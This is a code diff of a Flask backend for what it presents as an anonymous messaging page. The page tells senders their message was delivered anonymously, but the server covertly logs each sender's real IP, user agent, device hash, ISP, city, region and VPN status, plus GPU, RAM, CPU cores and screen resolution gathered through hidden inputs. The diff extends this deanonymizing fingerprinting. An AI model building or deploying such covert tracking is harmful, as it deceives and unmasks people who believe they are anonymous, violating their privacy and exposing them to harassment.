@@ -1,13 +1,13 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, render_template_string
 from flask_cors import CORS
 import datetime
 import requests
 
 app = Flask(__name__)
-# CORS allows your GitHub Pages site to send data to this Render server
+# CORS allows your GitHub Pages site to communicate with this Render server
 CORS(app)
 
-# The HTML shown after they hit 'Send'
+# The "Success" page displayed to the sender
 SUCCESS_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -15,14 +15,15 @@ SUCCESS_PAGE = """
     <title>Message Sent</title>
     <style>
         body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
-        h1 { color: #FE2F78; }
+        .box { background: white; padding: 40px; border-radius: 35px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #FE2F78; width: 320px; }
+        h1 { color: #FE2F78; margin-bottom: 10px; font-size: 24px; }
+        p { color: #666; font-size: 1rem; line-height: 1.5; }
     </style>
 </head>
 <body>
     <div class="box">
         <h1>✅ Sent!</h1>
-        <p>Your anonymous message was delivered.</p>
+        <p>Your anonymous message has been delivered to @itsghostblade</p>
     </div>
 </body>
 </html>
@@ -30,53 +31,62 @@ SUCCESS_PAGE = """
 
 @app.route('/')
 def home():
-    return "Backend is Running. Waiting for POST requests at /submit", 200
+    return "Backend is Active. Awaiting POST requests at /submit", 200
 
 @app.route('/submit', methods=['POST'])
 def submit():
     try:
-        # 1. Get the message text
-        msg = request.form.get('message', 'No Message')
-
-        # 2. Get IP and ISP (Server-Side)
-        # Render uses a proxy, so we check 'X-Forwarded-For' for the real IP
+        # 1. Capture the message and User-Agent (Device Model Info)
+        msg = request.form.get('message', 'Empty')
+        ua = request.headers.get('User-Agent', 'Unknown Browser')
+        
+        # 2. Capture the Unique Device Hash from the HTML script
+        dev_hash = request.form.get('device_hash', 'No-Hash-Found')
+        
+        # 3. Get Real IP (Handles Render's proxy headers)
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
         
-        isp_info = "Unknown ISP"
+        # 4. ISP & Location Lookup
+        network_info = "Lookup Failed"
         try:
-            # Quick lookup of the provider (Jio, Airtel, etc.)
-            response = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,mobile", timeout=5)
+            # Using ip-api for high accuracy in India
+            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,city,regionName,mobile,proxy", timeout=5)
             data = response.json()
-            isp_info = f"{data.get('isp')} | Mobile: {data.get('mobile')}"
+            if data.get('status') == 'success':
+                is_mobile = "YES" if data.get('mobile') else "NO"
+                is_vpn = "YES" if data.get('proxy') else "NO"
+                network_info = f"{data.get('isp')} ({data.get('city')}, {data.get('regionName')}) | Mobile: {is_mobile} | VPN: {is_vpn}"
         except:
             pass
 
-        # 3. Get Hardware Specs (Client-Side from hidden inputs)
-        gpu = request.form.get('gpu', 'Unknown GPU')
-        res = request.form.get('res', 'Unknown Res')
-        ram = request.form.get('ram', 'Unknown RAM')
-        cores = request.form.get('cores', 'Unknown Cores')
+        # 5. Get Hardware Specs from HTML hidden inputs
+        gpu = request.form.get('gpu', 'Unknown')
+        res = request.form.get('res', 'Unknown')
+        ram = request.form.get('ram', 'Unknown')
+        cores = request.form.get('cores', 'Unknown')
 
-        # 4. Format the "Unmasking" Log
+        # 6. Format the Log Entry
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        log_entry = (
-            f"\n{'='*40}\n"
-            f"🕒 TIME:    {timestamp}\n"
-            f"💬 MESSAGE: {msg}\n"
-            f"🌐 NETWORK: IP: {ip} | ISP: {isp_info}\n"
-            f"💻 HARDWARE: GPU: {gpu} | RAM: {ram}GB | CPU: {cores} cores | RES: {res}\n"
-            f"{'='*40}\n"
+        log_report = (
+            f"\n{'='*60}\n"
+            f"🎯 NEW MESSAGE RECEIVED: {timestamp}\n"
+            f"{'-'*60}\n"
+            f"🔑 DEVICE HASH: {dev_hash}\n"
+            f"💬 MESSAGE:     {msg}\n"
+            f"📱 USER-AGENT:  {ua}\n"
+            f"🌐 NETWORK:     IP: {ip} | {network_info}\n"
+            f"⚙️ HARDWARE:    GPU: {gpu} | RAM: {ram}GB | CPU: {cores} Cores | RES: {res}\n"
+            f"{'='*60}\n"
         )
 
-        # 5. Print to Render Logs (This is where you see the data)
-        print(log_entry)
+        # 7. Print to Render Logs
+        print(log_report)
 
-        # 6. Return a nice success page to the user
         return render_template_string(SUCCESS_PAGE)
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"ERROR: {e}")
         return "Internal Server Error", 500
 
 if __name__ == "__main__":
